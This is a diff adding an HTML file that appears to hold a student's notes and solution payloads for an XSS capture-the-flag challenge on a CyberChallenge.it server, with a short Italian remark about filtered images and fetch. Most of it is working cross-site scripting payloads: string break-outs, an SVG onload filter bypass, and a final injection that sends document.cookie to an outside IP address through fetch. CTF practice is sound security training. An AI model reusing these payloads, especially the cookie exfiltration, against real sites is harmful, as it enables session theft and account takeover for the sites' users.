@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+    const xss = "<img src=x onerror=alert(1)>";
+    const comment = `<!-- ${xss} -->`;
+    document.write(comment);
+    <!-- This is a comment -->
+    </script>
+  </head>
+    <body>
+    </body>
+</html>
+
+
+
+<!-- soluition:  http://xss5.challs.cyberchallenge.it/?html=%27)%0Aalert(1)// -->
+filtrato immagine, fetch
+')%0Anew Image().src='data:image/svg+xml,%3Csvg%20onload%3D%22alert(1)%22%3E%3C/svg%3E'//
+
+<script>
+http://xss5.challs.cyberchallenge.it/?html=')%0Adocument.body.innerHTML+=`<svg onload="fetch('http://130.136.4.142:8080/?cookie=${document.cookie}')"`>//
+</script>
